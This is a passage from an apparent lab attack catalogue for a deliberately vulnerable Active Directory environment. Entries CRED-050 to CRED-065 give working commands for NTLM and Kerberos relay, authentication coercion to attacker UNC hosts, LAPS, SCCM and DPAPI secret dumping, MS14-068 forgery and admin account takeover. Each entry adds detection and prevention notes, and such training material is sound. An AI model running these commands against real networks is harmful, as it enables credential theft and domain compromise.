**What it is:** trigger WebClient on a target with a `\\attacker@80\share` UNC → NTLM auth over HTTP → relay to LDAP without signing requirement → DA.
**Tools:** `PetitPotam`, `ntlmrelayx -t ldap://...`.
**Steps:**
```bash
ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user alice -smb2support --no-smb-server -http-port 80
python3 PetitPotam.py -u alice -p 'DVADlab2024!' '\\attacker@80/foo' file01.corp.local
```
**Detection:** non-DC LDAP write events for AdminSDHolder/User ACL.
**Prevention:** require LDAP signing; disable WebClient; SMB signing required.

---

### CRED-050 — DNSSEC ZSK Leak
**What it is:** misstored DNSSEC ZSK → re-sign zone or enumerate names. Edge-case, rarely useful in practice.
**Detection / Prevention:** keep ZSK in HSM; rotate per BCP.

---

### CRED-051 — `.library-ms` NTLM Hash Leak (CVE-2025-24071)
**What it is:** crafted `.library-ms` file with attacker UNC; Explorer auto-resolves on extraction → NTLMv2 leak.
**Tools:** crafted ZIP/RAR; `Responder` listener.
**Steps:** drop `evil.library-ms` referencing `\\attacker\share`; Responder captures.
**Detection:** Sysmon Event `3` (SMB connect from explorer.exe to external host).
**Prevention:** patch (March 2025 cumulative); block outbound SMB; force SMB signing.

---

### CRED-052 — NTLM Relay via `.library-ms` (CVE-2025-33073)
**What it is:** chain CRED-051 with `ntlmrelayx` to LDAP/HTTP/SMB target — code exec on relay target.
**Tools:** same as CRED-051 + `ntlmrelayx.py`.
**Steps:**
```bash
ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user alice -smb2support
# deliver .library-ms via shared archive
```
**Detection / Prevention:** same as CRED-051 + LDAP signing + channel binding.

---

### CRED-053 — ShadowCoerce (MS-FSRVP)
**What it is:** `IsPathSupported` of MS-FSRVP coerces DFSR/FSRVP-enabled host to authenticate.
**Tools:** `ShadowCoerce.py`.
**Steps:**
```bash
python3 ShadowCoerce.py -u alice -p 'DVADlab2024!' -d corp.local 10.10.0.100 dc01.corp.local
```
**Detection / Prevention:** RPC filter for FSRVP; patch (KB5015754).

---

### CRED-054 — Pre-Windows 2000 Computer Account Abuse
**What it is:** "Pre-Windows 2000 Compatible Access" group + computer accounts created with lowercase-name password → predictable machine secret → Silver/RBCD.
**Tools:** `Pre2k.py`, `kerbrute`.
**Steps:**
```bash
python3 pre2k.py auth -d corp.local -dc-ip 10.10.0.10 -inputfile machines.txt -outputfile pre2k.csv
```
**Detection:** Event `4624` Logon Type 3 with machine account using default password.
**Prevention:** clear Pre-Windows 2000 group; force-reset all machine passwords.

---

### CRED-055 — RemoteMonologue (DCOM → NTLMv2)
**What it is:** trigger DCOM auth from a target, captured by Responder/Internal-Monologue.
**Tools:** `RemoteMonologue.py`, `Internal-Monologue.exe`.
**Steps:**
```bash
python3 remotemonologue.py -u alice -p 'DVADlab2024!' -d corp.local -t 10.10.0.13
```
**Detection:** Sysmon `1` `mmc.exe`/`taskmgr.exe` spawning DCOM under unusual parent.
**Prevention:** disable DCOM (`HKLM\Software\Microsoft\Ole\EnableDCOM=N`) where unused; block outbound NTLM.

---

### CRED-056 — "Walking Dead" — Disabled Account Abuse
**What it is:** disabled account that still has Domain Admin group membership. `GenericAll` on the object → re-enable, set password, login.
**Why it works here:** `da_old` disabled but DA-member; helpdesk has GenericAll.
**Tools:** `net user`, `Set-ADAccountPassword`, `Enable-ADAccount`.
**Steps:**
```powershell
Enable-ADAccount -Identity da_old
Set-ADAccountPassword da_old -NewPassword (ConvertTo-SecureString 'Pwn3d!' -AsPlainText -Force) -Reset
```
**Detection:** Event `4722` (account enabled), `4724` (password reset by admin).
**Prevention:** disable + REMOVE group memberships; remove disabled accounts from privileged groups.

---

### CRED-057 — AD Recycle Bin Restore
**What it is:** restore a deleted privileged object → it comes back with all memberships and sIDHistory.
**Tools:** `Restore-ADObject`, `Get-ADObject -IncludeDeletedObjects`.
**Steps:**
```powershell
Get-ADObject -IncludeDeletedObjects -Filter 'isDeleted -eq $true' |
   ? { $_.Name -like '*DA*' } | Restore-ADObject
```
**Detection:** Event `5136` (restore writes).
**Prevention:** restrict `Restore-ADObject` rights; monitor Recycle Bin operations.

---

### CRED-058 — gMSADumper
**What it is:** Python alternative for CRED-034. Same primitive.

---

### CRED-059 — goLAPS / LAPS v2 Bulk Read
**What it is:** ReadLAPSPassword extended right delegated across an OU → dump every host.
**Tools:** `goLAPS`, `LAPSDumper.py`, `nxc ldap --laps`.
**Steps:**
```bash
./goLAPS -u alice -p 'DVADlab2024!' -d corp.local -dc 10.10.0.10
```
**Detection:** large `4662` for ms-LAPS-Password / ms-Mcs-AdmPwd reads.
**Prevention:** Windows LAPS with encryption; restrict ReadLAPSPassword to a security group, not All Authenticated Users.

---

### CRED-060 — SCCMDecryptor (NAA / policy DPAPI)
**What it is:** SCCM Network Access Account creds are stored DPAPI-encrypted in the WMI repository (`CCM_NetworkAccessAccount`). Decrypt → site-wide creds.
**Tools:** `SharpSCCM`, `sccmhunter`, `SCCMDecryptor-BOF`.
**Steps:**
```powershell
.\SharpSCCM.exe local secrets
```
**Detection:** WMI namespace access from unusual processes.
**Prevention:** disable NAA; use enhanced HTTP-only PKI mode; tier SCCM.

---

### CRED-061 — Kerberos Relay via CNAME
**What it is:** ADIDNS write → CNAME victim → krbrelayx captures Kerberos auth (SPN-bound) → replay to LDAP.
**Tools:** `krbrelayx.py`.
**Steps:**
```bash
python3 dnstool.py -u 'corp\alice' -p 'DVADlab2024!' \
   -r 'fs1' --action add --data 10.10.0.100 10.10.0.10
python3 krbrelayx.py -t ldap://dc01.corp.local --delegate-access
```
**Detection:** Event `5136` adding CNAMEs in DNS.
**Prevention:** ADIDNS ACL hardening; KDC-cert-strict; SPN-based mitigations (KB5034439).

---

### CRED-062 — Reflective Kerberos Relay
**What it is:** krbrelayx reflects Kerberos auth back to the same host's LSASS pipe → local SYSTEM. Local privesc variant of KrbRelayUp.
**Tools:** `krbrelay.exe`, `KrbRelayUp`.
**Steps:**
```cmd
KrbRelayUp.exe full --Method SCM
```
**Detection:** local LSASS pipe writes from unexpected source PID.
**Prevention:** `EnableLocalMachineAuthenticationLevel` registry mitigation; LDAP signing + channel binding.

---

### CRED-063 — MS14-068 PAC Forgery
**What it is:** unpatched DC accepts forged PAC in TGT → any user becomes Domain Admin. Legacy but lab-injected.
**Tools:** `goldenPac.py`, `pykek`.
**Steps:**
```bash
impacket-goldenPac corp.local/alice:'DVADlab2024!'@dc01.corp.local
```
**Detection:** Event `4769` with mismatched PAC signature; KDC log signature failure.
**Prevention:** patch (KB3011780 — 2014); should be impossible on any DC built since 2015.

---

### CRED-064 — Internal-Monologue (NetNTLMv1 downgrade)
**What it is:** force local processes to NetNTLMv1 by toggling `LMCompatibilityLevel` per session, capture, crack at `crack.sh`.
**Tools:** `Internal-Monologue.exe`.
**Steps:**
```powershell
.\Internal-Monologue.exe -impersonate
```
**Detection:** abrupt change of LMCompatibilityLevel; NetNTLMv1 logon events.
**Prevention:** `LMCompatibilityLevel=5`; Protected Users.

---

### CRED-065 — Remote DPAPI via Backup Key
**What it is:** the domain DPAPI backup key (stored on DC) can decrypt *any* user's masterkey. With DA you can pull it and decrypt anything offline forever.
**Tools:** `mimikatz lsadump::backupkeys`, `SharpDPAPI backupkey`.
**Steps:**
```powershell
.\mimikatz.exe "lsadump::backupkeys /system:dc01.corp.local /export"
.\SharpDPAPI.exe backupkey /server:dc01.corp.local
```
**Detection:** MS-BKRP RPC calls from non-DC IP.
**Prevention:** tier-0; restrict who can hit DC RPC; rotate the DPAPI backup key after compromise (painful but necessary).

---

Next: [`04-lateral-movement.md`](04-lateral-movement.md).
